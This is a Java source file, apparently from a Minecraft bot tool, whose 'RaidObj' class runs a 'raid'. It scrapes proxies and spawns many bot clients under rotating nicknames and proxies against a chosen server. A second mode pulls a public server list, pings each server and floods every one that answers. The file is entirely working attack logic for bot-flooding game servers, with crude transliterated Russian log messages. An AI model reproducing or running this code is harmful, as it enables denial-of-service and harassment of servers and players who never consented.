package net.PRP.MCAI;

import java.io.IOException;
import java.net.Proxy;
import java.util.List;

import ch.jamiete.mcping.MinecraftPing;
import ch.jamiete.mcping.MinecraftPingOptions;
import ch.jamiete.mcping.MinecraftPingReply;
import net.PRP.MCAI.GUI.SteeringWheel;
import net.PRP.MCAI.bot.Bot;
import net.PRP.MCAI.utils.BotU;
import net.PRP.MCAI.utils.ThreadU;
import ru.justnanix.parser.ServerParser;

public class RaidObj extends RaidSkl {
	
	private Thread raidThread;
	
	public RaidObj() throws IOException {
		if (Main.raidObjectCreatedAlready) {
			throw new IOException("ti eblan? ti uzhe sozdal raid ataku");
		}
		raidThread = new Thread(()->{
			Main.initializeBlockType();
			Main.updateSettings();
			Main.proxies = ProxyScraper.ab();
			Main.updatePasti();
			Main.nicks = Main.getnicksinit();
	    	if ((int)Main.getset("mode")==1) {
		    	if (Main.debug) {
		    		new Thread(new Bot("testBot", "localhost:25565", Proxy.NO_PROXY, false)).start();
		    	} else {
		    		new Thread(()->{
		    			int tsuc = 0;
		    			int tbad = 0;
		    			while (true) {
		    				tsuc = 0;
		    				tbad = 0;
		    				for (Bot bot:Main.bots) {
		    					if (bot.connected) ++tsuc; else ++tbad;
		    				}
		    				Main.suc = tsuc;
		    				Main.bad = tbad;
		    				if (!Main.debug) System.out.println("{ suc:"+Main.suc+" bad:"+Main.bad+" all:"+Main.bots.size()+" }");
		    				Main.updateSettings();
		    				Main.updatePasti();
		        			ThreadU.sleep(1000);
		    			}
		    		}).start();
			    	if ((boolean) Main.getset("window")) {
			    		new SteeringWheel();
			    	} else {
			    		int botcount = (int)Main.getset("bots") == -1 ? Main.proxies.size() : (int)Main.getset("bots");
				    	String ip = (String)Main.getset("host");
				    	for (int i = 0; i < botcount; i++) {
					        String USERNAME = Main.nextNick();
					        Main. nextProxy();
					        new Thread(() -> {
						        //System.out.println("created bot name: "+USERNAME+" proxy: "+proxy.toString());
								new Thread(new Bot(USERNAME, ip, Main.proxy,(boolean)Main.getset("chetodelat"))).start();
					        }).start();
						    ThreadU.sleep((int) Main.getset("enterrange"));
				    	}
			    	}
	    		}
			} else if ((int)Main.getset("mode")==2) {
				if ((boolean) Main.getset("window")) {
					BotU.log("оконный режим не поддерживается при этом методе рейда");
				}
				
				new Thread(()->{
					
					ServerParser sp = new ServerParser().init();
					List<String> ips = sp.getServers();
					for (String ip : ips) {
						if (!ip.contains(":")) {
							ips.remove(ip);
							ips.add(ip+":25565");
						}
					}
					for (String ip : ips) {
						BotU.log("checking: "+ip);
						new Thread(()->{
							try {
								MinecraftPing h = new MinecraftPing();
								MinecraftPingOptions mpo = new MinecraftPingOptions();
								mpo.setHostname(ip.split(":")[0]);
								mpo.setPort(Integer.parseInt(ip.split(":")[1]));
								h.getPing(mpo);
								//if (p.getVersion().getProtocol() != MinecraftConstants.PROTOCOL_VERSION) return;
								BotU.log("trahau: "+ip);
								int botcount = (int)Main.getset("bots") == -1 ? Main.proxies.size() : (int)Main.getset("bots");
						    	for (int i = 0; i < botcount; i++) {
							        String USERNAME = Main.nextNick();
							        Main.nextProxy();
							        //int ii = i;
							        new Thread(() -> {
								        //System.out.println("created bot "+ii+"/"+botcount+"name: "+USERNAME+" proxy: "+proxy.toString());
										new Thread(new Bot(USERNAME, ip, Main.proxy,(boolean)Main.getset("chetodelat"))).start();
							        }).start();
								    ThreadU.sleep((int) Main.getset("enterrange"));
						    	}
							} catch (IOException e) {
								BotU.log("serv "+ip+" ne rabotaet");
							}
						}).start();
						
					}
					
				}).start();
				
			}
		});
	}

	@Override
	public boolean start() {
		try {
			raidThread.start();
			return true;
		} catch (Exception e) {
			return false;
		}
	}

	@Override
	public void end() {
		for (Bot client : Main.bots) {
			client.kill();
		}
		raidThread.stop();
		raidThread = null;
		Main.raidObjectCreatedAlready = false;
	}

}
